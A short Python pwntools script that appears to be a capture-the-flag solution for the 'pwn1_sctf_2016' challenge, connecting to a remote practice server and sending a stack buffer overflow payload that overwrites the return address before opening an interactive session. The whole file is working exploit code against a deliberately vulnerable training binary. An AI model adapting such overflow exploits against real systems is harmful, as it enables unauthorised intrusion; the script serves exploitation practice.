from pwn import *

# r=process('./pwn1_sctf_2016')
r= remote("node5.buuoj.cn",28711)

payload=b'I'*20+b'b'*4+p32(0x8048F0D)

r.sendline(payload)
r.interactive()